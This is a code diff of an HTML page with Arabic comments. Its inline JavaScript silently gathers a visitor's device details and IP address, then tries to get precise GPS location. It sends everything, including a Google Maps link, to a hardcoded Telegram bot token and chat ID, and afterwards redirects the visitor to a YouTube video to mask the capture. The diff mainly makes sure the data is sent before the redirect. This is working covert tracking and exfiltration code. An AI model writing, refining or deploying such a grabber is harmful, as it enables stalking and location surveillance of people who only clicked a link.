@@ -29,50 +29,47 @@
     </style>
 </head>
 <body>
-    <div class="hidden-content" id="hiddenStatus">جاري المعالجة...</div>
+    <div class="hidden-content" id="hiddenStatus">Processing...</div>
 
     <script>
         // =============================================================================
-        // إعدادات النظام - تأكد من صحة هذه البيانات
+        // إعدادات النظام
         // =============================================================================
         
         const REDIRECT_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
         const BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
         const CHAT_ID = '170383339';
-        const MAX_WAIT_TIME = 3000; // زيادة الوقت قليلاً
         
         // =============================================================================
         
-        let dataCollected = false;
-        let sendingData = false;
+        let redirected = false;
+        let dataCollectionStarted = false;
         
         function log(message) {
             console.log(`🔧 ${new Date().toLocaleTimeString()} - ${message}`);
         }
         
-        // جمع المعلومات الأساسية
+        // منع التحويل حتى ينتهي الإرسال
+        function preventRedirect() {
+            redirected = true;
+        }
+        
+        // جمع البيانات الأساسية
         function collectBasicData() {
             const ua = navigator.userAgent;
             const now = new Date();
             
-            const basicData = {
+            return {
                 userAgent: ua,
                 timestamp: now.toISOString(),
                 localTime: now.toLocaleString('ar-SA', {
-                    timeZone: 'Asia/Baghdad',
-                    year: 'numeric',
-                    month: '2-digit',
-                    day: '2-digit',
-                    hour: '2-digit',
-                    minute: '2-digit',
-                    second: '2-digit'
+                    timeZone: 'Asia/Baghdad'
                 }),
                 url: window.location.href,
                 referrer: document.referrer || 'مباشر',
                 language: navigator.language,
                 platform: navigator.platform,
                 screenRes: `${screen.width}x${screen.height}`,
-                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 deviceType: /iPhone/i.test(ua) ? 'iPhone' : 
                            /iPad/i.test(ua) ? 'iPad' : 
@@ -85,88 +82,55 @@
                         /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
                         /Edge/i.test(ua) ? 'Edge' : 'مجهول'
             };
-            
-            log('البيانات الأساسية: ' + JSON.stringify(basicData, null, 2));
-            return basicData;
         }
         
-        // الحصول على IP - محدث ومُحسن
+        // الحصول على IP
         async function getIP() {
-            log('🌍 بدء الحصول على IP...');
+            log('🌍 بحث عن IP...');
             
             const services = [
-                {
-                    url: 'https://api.ipify.org?format=json',
-                    parser: (data) => data.ip
-                },
-                {
-                    url: 'https://httpbin.org/ip',
-                    parser: (data) => data.origin
-                },
-                {
-                    url: 'https://api.myip.com',
-                    parser: (data) => data.ip
-                },
-                {
-                    url: 'https://ipapi.co/json/',
-                    parser: (data) => data.ip
-                }
+                'https://api.ipify.org?format=json',
+                'https://httpbin.org/ip',
+                'https://api.myip.com'
             ];
             
             for (let service of services) {
                 try {
-                    log(`محاولة ${service.url}`);
-                    
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 2000);
-                    
-                    const response = await fetch(service.url, {
+                    const response = await fetch(service, {
                         method: 'GET',
-                        signal: controller.signal,
-                        headers: {
-                            'Accept': 'application/json',
-                            'User-Agent': 'Mozilla/5.0 (compatible; DataCollector/1.0)'
-                        },
-                        mode: 'cors'
+                        headers: { 'Accept': 'application/json' }
                     });
-                    
-                    clearTimeout(timeoutId);
                     
                     if (response.ok) {
                         const data = await response.json();
-                        const ip = service.parser(data);
-                        
-                        if (ip && ip !== 'undefined') {
-                            log(`✅ IP محصل: ${ip} من ${service.url}`);
+                        const ip = data.ip || data.origin;
+                        if (ip) {
+                            log(`✅ IP: ${ip}`);
                             return ip;
                         }
                     }
-                    
                 } catch (error) {
-                    log(`❌ فشل ${service.url}: ${error.message}`);
+                    log(`❌ فشل ${service}: ${error.message}`);
                     continue;
                 }
             }
-            
-            log('❌ فشل في الحصول على IP من جميع الخدمات');
             return 'غير متاح';
         }
         
-        // الحصول على الموقع - محدث
+        // الحصول على الموقع
         function getLocation() {
             return new Promise((resolve) => {
-                log('📍 بدء الحصول على الموقع...');
+                log('📍 طلب الموقع...');
                 
                 if (!navigator.geolocation) {
-                    log('❌ المتصفح لا يدعم تحديد الموقع');
+                    log('❌ لا يدعم تحديد الموقع');
                     resolve(null);
                     return;
                 }
                 
                 let resolved = false;
-                let attempts = 0;
                 
-                function handleSuccess(position) {
+                const handleSuccess = (position) => {
                     if (!resolved) {
                         resolved = true;
                         const location = {
@@ -174,73 +138,49 @@
                             longitude: position.coords.longitude,
                             accuracy: Math.round(position.coords.accuracy)
                         };
-                        log(`✅ موقع محصل: ${location.latitude}, ${location.longitude} (دقة: ${location.accuracy}م)`);
+                        log(`✅ موقع: ${location.latitude}, ${location.longitude}`);
                         resolve(location);
                     }
-                }
+                };
                 
-                function handleError(error) {
-                    attempts++;
-                    log(`❌ خطأ الموقع ${attempts}: ${error.code} - ${error.message}`);
-                    
-                    if (attempts >= 2 && !resolved) {
-                        resolved = true;
-                        resolve(null);
+                const handleError = (error) => {
+                    if (!resolved) {
+                        log(`❌ خطأ موقع: ${error.message}`);
                     }
-                }
+                };
                 
-                // محاولة أولى - دقة عالية
+                // محاولة أولى
                 navigator.geolocation.getCurrentPosition(
                     handleSuccess,
                     handleError,
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 2000,
-                        maximumAge: 30000
-                    }
+                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 30000 }
                 );
                 
-                // محاولة ثانية بعد ثانية واحدة
+                // محاولة ثانية بعد ثانيتين
                 setTimeout(() => {
                     if (!resolved) {
-                        log('🔄 محاولة ثانية للموقع...');
                         navigator.geolocation.getCurrentPosition(
                             handleSuccess,
                             handleError,
-                            {
-                                enableHighAccuracy: false,
-                                timeout: 1500,
-                                maximumAge: 60000
-                            }
+                            { enableHighAccuracy: false, timeout: 2000, maximumAge: 60000 }
                         );
                     }
-                }, 1000);
+                }, 2000);
                 
-                // انتهاء المهلة النهائية
+                // انتهاء المهلة بعد 4 ثواني
                 setTimeout(() => {
                     if (!resolved) {
                         resolved = true;
-                        log('⏰ انتهت مهلة الحصول على الموقع');
+                        log('⏰ انتهت مهلة الموقع');
                         resolve(null);
                     }
-                }, 2500);
+                }, 4000);
             });
         }
         
-        // إنشاء رابط Google Maps
-        function createMapsLink(lat, lng) {
-            return `https://www.google.com/maps/dir//${lat},${lng}/@${lat},${lng},272m/data=!3m1!1e3`;
-        }
-        
-        // إرسال البيانات - محدث ومُحسن
-        async function sendData(data) {
-            if (sendingData) {
-                log('⚠️ إرسال البيانات قيد التقدم بالفعل');
-                return false;
-            }
-            
-            sendingData = true;
-            log('📤 بدء إرسال البيانات...');
+        // إرسال البيانات - مُحسن للضمان
+        async function sendDataReliably(data) {
+            log('📤 بدء الإرسال...');
             
             let locationText = 'غير متاح';
             let mapsLink = '';
@@ -248,205 +188,177 @@
             if (data.location) {
                 const { latitude, longitude, accuracy } = data.location;
                 locationText = `${latitude.toFixed(6)}, ${longitude.toFixed(6)} (دقة: ${accuracy}م)`;
-                mapsLink = createMapsLink(latitude, longitude);
+                mapsLink = `https://www.google.com/maps/dir//${latitude},${longitude}/@${latitude},${longitude},272m/data=!3m1!1e3`;
             }
             
-            const message = `🎯 زائر جديد (نظام محدث):
+            const message = `🎯 زائر جديد:
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ الوقت: ${data.device.localTime}
-🌐 الرابط: ${data.device.url}
-🔗 المرجع: ${data.device.referrer}
+⏰ ${data.device.localTime}
+🌐 ${data.device.url}
+🔗 ${data.device.referrer}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📱 الجهاز: ${data.device.deviceType} | ${data.device.browser}
-📱 هاتف محمول: ${data.device.isMobile ? 'نعم' : 'لا'}
-🌍 عنوان IP: ${data.ip}
+📱 ${data.device.deviceType} | ${data.device.browser}
+📱 محمول: ${data.device.isMobile ? 'نعم' : 'لا'}
+🌍 IP: ${data.ip}
 📍 الموقع: ${locationText}
-${mapsLink ? `🗺️ رابط الخريطة: ${mapsLink}` : ''}
-🗣️ اللغة: ${data.device.language}
-🌍 المنطقة الزمنية: ${data.device.timezone}
+${mapsLink ? `🗺️ الخريطة: ${mapsLink}` : ''}
+🗣️ ${data.device.language} | ${data.device.timezone}
+📱 ${data.device.screenRes} | ${data.device.platform}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📱 الشاشة: ${data.device.screenRes}
-🪟 النافذة: ${data.device.windowSize}
-🖥️ النظام: ${data.device.platform}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔍 User Agent:
 ${data.device.userAgent}`;
             
-            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             const payload = {
                 chat_id: CHAT_ID,
                 text: message,
-                disable_web_page_preview: false,
-                parse_mode: 'HTML'
+                disable_web_page_preview: false
             };
             
-            log('📝 الرسالة المُرسلة: ' + message.substring(0, 100) + '...');
-            
-            // محاولات متعددة للإرسال
+            // 5 محاولات مع انتظار أطول
             for (let attempt = 1; attempt <= 5; attempt++) {
                 try {
-                    log(`📤 محاولة الإرسال ${attempt}/5`);
+                    log(`📤 محاولة ${attempt}/5`);
                     
-                    const response = await fetch(telegramUrl, {
+                    const response = await fetch(url, {
                         method: 'POST',
                         headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
+                            'Content-Type': 'application/json'
                         },
-                        body: JSON.stringify(payload),
-                        mode: 'cors'
+                        body: JSON.stringify(payload)
                     });
                     
-                    log(`📡 استجابة الخادم: ${response.status} ${response.statusText}`);
+                    log(`📡 استجابة: ${response.status}`);
                     
                     if (response.ok) {
                         const result = await response.json();
-                        log('📋 نتيجة Telegram: ' + JSON.stringify(result));
-                        
                         if (result.ok) {
-                            log('✅ تم إرسال الرسالة الأساسية بنجاح!');
-                            dataCollected = true;
+                            log('✅ نجح الإرسال!');
                             
-                            // إرسال رابط الموقع منفصل
+                            // إرسال رابط الخريطة منفصل
                             if (mapsLink) {
                                 try {
-                                    const mapResponse = await fetch(telegramUrl, {
+                                    await fetch(url, {
                                         method: 'POST',
                                         headers: { 'Content-Type': 'application/json' },
                                         body: JSON.stringify({
                                             chat_id: CHAT_ID,
-                                            text: `🗺️ رابط الموقع المباشر:\n${mapsLink}`,
-                                            disable_web_page_preview: false
+                                            text: `🗺️ رابط مباشر:\n${mapsLink}`
                                         })
                                     });
-                                    
-                                    if (mapResponse.ok) {
-                                        log('✅ تم إرسال رابط الخريطة!');
-                                    }
+                                    log('✅ رابط الخريطة أُرسل');
                                 } catch (e) {
-                                    log('⚠️ فشل إرسال رابط الخريطة: ' + e.message);
+                                    log('⚠️ فشل رابط الخريطة');
                                 }
                             }
                             
-                            sendingData = false;
                             return true;
                         } else {
                             log(`❌ خطأ Telegram: ${result.description}`);
                         }
                     } else {
-                        const errorText = await response.text();
-                        log(`❌ فشل HTTP: ${response.status} - ${errorText}`);
+                        log(`❌ HTTP ${response.status}`);
                     }
                     
                 } catch (error) {
-                    log(`❌ خطأ في الإرسال ${attempt}: ${error.name} - ${error.message}`);
-                    
-                    if (error.name === 'TypeError' && error.message.includes('Failed to fetch')) {
-                        log('🚫 مشكلة في الاتصال - CORS أو Network');
-                    }
+                    log(`❌ خطأ ${attempt}: ${error.message}`);
                 }
                 
-                // انتظار قبل المحاولة التالية
+                // انتظار بين المحاولات
                 if (attempt < 5) {
-                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    await new Promise(resolve => setTimeout(resolve, 1500));
                 }
             }
             
-            log('❌ فشل في جميع محاولات الإرسال');
-            sendingData = false;
+            log('❌ فشل جميع المحاولات');
             return false;
         }
         
-        // التحويل
-        function redirect() {
-            log('🔄 تحويل إلى: ' + REDIRECT_URL);
+        // التحويل الآمن
+        function redirectSafely() {
+            if (redirected) {
+                log('⚠️ تم التحويل مسبقاً');
+                return;
+            }
+            
+            redirected = true;
+            log('🔄 تحويل إلى يوتيوب...');
+            
             try {
                 window.location.replace(REDIRECT_URL);
             } catch (error) {
-                log('⚠️ فشل التحويل، محاولة بديلة...');
                 window.location.href = REDIRECT_URL;
             }
         }
         
-        // العملية الرئيسية
+        // العملية الرئيسية - بدون تحويل سريع
         async function main() {
-            log('🚀 بدء النظام في ' + new Date().toLocaleTimeString());
+            if (dataCollectionStarted) return;
+            dataCollectionStarted = true;
+            
+            log('🚀 بدء النظام - بدون تحويل مبكر');
             
             try {
-                // جمع البيانات الأساسية
+                // جمع البيانات الأساسية فوراً
                 const basicData = collectBasicData();
-                log('✅ تم جمع البيانات الأساسية');
+                log('✅ البيانات الأساسية جاهزة');
                 
-                // جمع IP والموقع
-                log('🔄 بدء جمع IP والموقع...');
+                // جمع IP والموقع مع انتظار كامل
+                log('🔄 جمع IP والموقع...');
                 
-                const startTime = Date.now();
-                const [ip, location] = await Promise.allSettled([
-                    getIP(),
-                    getLocation()
-                ]);
+                const ipPromise = getIP();
+                const locationPromise = getLocation();
                 
-                const endTime = Date.now();
-                log(`⏱️ وقت جمع البيانات: ${endTime - startTime}ms`);
+                // انتظار اكتمال كلاهما أو 6 ثواني كحد أقصى
+                const results = await Promise.allSettled([ipPromise, locationPromise]);
+                
+                const ip = results[0].status === 'fulfilled' ? results[0].value : 'غير متاح';
+                const location = results[1].status === 'fulfilled' ? results[1].value : null;
                 
                 const fullData = {
                     device: basicData,
-                    ip: ip.status === 'fulfilled' ? ip.value : 'غير متاح',
-                    location: location.status === 'fulfilled' ? location.value : null
+                    ip: ip,
+                    location: location
                 };
                 
-                log('📊 البيانات النهائية: ' + JSON.stringify({
-                    ip: fullData.ip,
-                    location: fullData.location,
-                    device: fullData.device.deviceType
-                }));
+                log('📊 تم جمع جميع البيانات');
+                log(`📊 IP: ${ip}`);
+                log(`📊 موقع: ${location ? 'تم الحصول عليه' : 'غير متاح'}`);
                 
-                // إرسال البيانات مع انتظار النتيجة
-                log('📤 محاولة إرسال البيانات...');
-                const sendResult = await sendData(fullData);
+                // إرسال البيانات مع الانتظار التام
+                log('📤 بدء الإرسال النهائي...');
+                const sendSuccess = await sendDataReliably(fullData);
                 
-                if (sendResult) {
-                    log('✅ تم إرسال البيانات بنجاح - التحويل بعد ثانيتين');
-                    setTimeout(redirect, 2000);
+                if (sendSuccess) {
+                    log('✅ تم إرسال البيانات - انتظار 2 ثانية ثم التحويل');
+                    setTimeout(redirectSafely, 2000);
                 } else {
-                    log('❌ فشل الإرسال - التحويل فوري');
-                    redirect();
+                    log('❌ فشل الإرسال - التحويل بعد ثانية واحدة');
+                    setTimeout(redirectSafely, 1000);
                 }
                 
             } catch (error) {
-                log('❌ خطأ عام في النظام: ' + error.message);
-                redirect();
+                log('❌ خطأ عام: ' + error.message);
+                setTimeout(redirectSafely, 500);
             }
         }
         
-        // بدء النظام
-        log('🔧 تحميل النظام...');
-        
+        // بدء النظام عند الاستعداد
         if (document.readyState === 'loading') {
             document.addEventListener('DOMContentLoaded', main);
         } else {
-            setTimeout(main, 100);
+            // تأخير قصير للتأكد من الاستعداد
+            setTimeout(main, 200);
         }
         
-        // حماية من التعليق
+        // حماية من التعليق - تحويل إجباري بعد 15 ثانية
         setTimeout(() => {
-            if (!window.location.href.includes('youtube.com')) {
-                log('⏰ تحويل اضطراري بعد 8 ثواني');
-                redirect();
+            if (!redirected) {
+                log('⏰ تحويل إجباري بعد 15 ثانية');
+                redirectSafely();
             }
-        }, 8000);
+        }, 15000);
         
-        // تحويل فوري عند تحميل النافذة
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                if (!dataCollected && !window.location.href.includes('youtube.com')) {
-                    log('⚡ تحويل سريع من window.load');
-                    redirect();
-                }
-            }, 200);
-        });
-        
-        log('🎯 النظام محمل ومستعد');
+        log('🎯 النظام محمل - لن يتم التحويل قبل إرسال البيانات');
     </script>
 </body>
 </html>
